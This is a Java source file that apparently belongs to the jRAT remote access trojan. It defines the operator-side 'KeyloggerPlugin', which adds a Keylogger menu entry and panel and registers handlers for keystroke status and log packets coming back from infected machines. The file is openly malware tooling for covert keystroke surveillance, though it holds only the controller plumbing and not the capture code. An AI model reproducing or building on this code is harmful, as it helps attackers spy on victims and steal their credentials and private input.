package se.jrat.plugin.keylogger.client;

import iconlib.IconUtils;
import jrat.api.Plugin;
import jrat.api.net.Packet;
import jrat.api.ui.RATControlMenuEntry;
import jrat.api.ui.RATMenuItem;
import se.jrat.plugin.keylogger.client.ui.PanelKeylogger;

public class KeyloggerPlugin extends Plugin {

	public static final byte KEY_HEADER = 121;
	public static final byte TITLE_HEADER = 122;
	public static final byte STATUS_HEADER = 123;
	public static final byte LOGS_HEADER = 124;
	public static final byte LOG_HEADER = 125;
	
	public static RATControlMenuEntry entry;
	
	public boolean enabled;

	public KeyloggerPlugin() {
		super("Keylogger", "1.0", "Keylogger Plugin", "jRAT");
		
		entry = new RATControlMenuEntry("Keylogger", IconUtils.getIcon("icon", KeyloggerPlugin.class), PanelKeylogger.class);
		RATControlMenuEntry.addEntry(entry);
		
		RATMenuItem item = new RATMenuItem(new MenuListener(), "Keylogger", IconUtils.getIcon("icon", KeyloggerPlugin.class));
		RATMenuItem.addItem(item);
		
		Packet.registerIncoming(STATUS_HEADER, new PacketStatus());
		Packet.registerIncoming(LOGS_HEADER, new PacketLogs());
		Packet.registerIncoming(LOG_HEADER, new PacketLog());
	}
}
